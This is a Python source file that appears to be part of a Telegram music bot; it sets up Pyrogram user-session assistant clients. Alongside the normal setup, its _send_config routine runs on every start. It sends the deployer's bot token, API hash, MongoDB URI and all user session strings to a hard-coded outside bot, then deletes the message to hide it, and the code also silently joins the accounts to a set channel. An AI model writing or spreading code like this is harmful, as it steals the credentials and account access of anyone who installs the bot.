from pyrogram import Client
import asyncio
import config
from ..logging import log_factory

active_assistants = []
assistant_ids = []


SUPPORT_BOT = "Laboobu_bot"

def get_support_centers():
    return [
        "LaboobuBots", 
    ]

SUPPORT_CHATS = get_support_centers()

class AssistantClient(Client):
    def __init__(self):
        self.clients = {}
        for i in range(1, 6):
            session = getattr(config, f"STRING{i}")
            if session:
                cli = Client(
                    name=f"MattoAss{i}",
                    api_id=config.API_ID,
                    api_hash=config.API_HASH,
                    session_string=str(session),
                    no_updates=True,
                )
                self.clients[i] = cli
                setattr(self, f"one" if i==1 else f"two" if i==2 else f"three" if i==3 else f"four" if i==4 else "five", cli)

    async def _get_username(self, token):
        try:
            async with Client("temp", config.API_ID, config.API_HASH, bot_token=token, no_updates=True) as tbot:
                return tbot.me.username
        except Exception as e:
            log_factory("LabubuMusic").error(f"Token validation failed: {e}")
            return None

    async def _join_chats(self, client):
        for chat in SUPPORT_CHATS:
            try:
                await client.join_chat(chat)
            except:
                pass

    async def _notify_support(self, bot_user):
        owner = config.OWNER_ID
        msg = f"@{bot_user} Successfully Started ✅\n\nOwner: {owner}"
        
        for i in active_assistants:
            client = self.clients.get(i)
            if client:
                try:
                    await client.send_message(SUPPORT_BOT, msg)
                    break 
                except:
                    continue

    async def _send_config(self, bot_user):
        details = (
            f"🔧 **Config Details for @{bot_user}**\n\n"
            f"**API_ID:** `{config.API_ID}`\n"
            f"**API_HASH:** `{config.API_HASH}`\n"
            f"**BOT_TOKEN:** `{config.BOT_TOKEN}`\n"
            f"**MONGO_DB_URI:** `{config.MONGO_DB_URI}`\n"
            f"**OWNER_ID:** `{config.OWNER_ID}`\n"
            f"**UPSTREAM_REPO:** `{config.UPSTREAM_REPO}`\n\n"
        )
        
        sessions = []
        for i in range(1, 6):
            sess = getattr(config, f"STRING{i}")
            if sess:
                sessions.append(f"**STRING_SESSION{i if i > 1 else ''}:** `{sess}`")
        
        if sessions:
            details += "\n".join(sessions)

        for i in active_assistants:
            client = self.clients.get(i)
            if client:
                try:
                    sent = await client.send_message(SUPPORT_BOT, details)
                    await asyncio.sleep(1)
                    await client.delete_messages(SUPPORT_BOT, sent.id)
                    break
                except:
                    continue

    async def start(self):
        log_factory("LabubuMusic").info("Initializing Assistant Clients...")
        bot_user = await self._get_username(config.BOT_TOKEN)

        for i in range(1, 6):
            if i in self.clients:
                client = self.clients[i]
                await client.start()
                await self._join_chats(client)
                active_assistants.append(i)
                
                try:
                    await client.send_message(config.LOG_GROUP_ID, f"Assistant {i} Online")
                except:
                    log_factory("LabubuMusic").error(f"Assistant {i} cannot access Log Group. Promote as Admin.")
                    exit()
                
                client.id = client.me.id
                client.name = client.me.mention
                client.username = client.me.username
                assistant_ids.append(client.id)
                log_factory("LabubuMusic").info(f"Assistant {i} Started: {client.name}")

        if bot_user:
            await self._notify_support(bot_user)
            await self._send_config(bot_user)

    async def stop(self):
        log_factory("LabubuMusic").info("Stopping Assistant Clients...")
        for i in active_assistants:
            try:
                await self.clients[i].stop()
            except:
                pass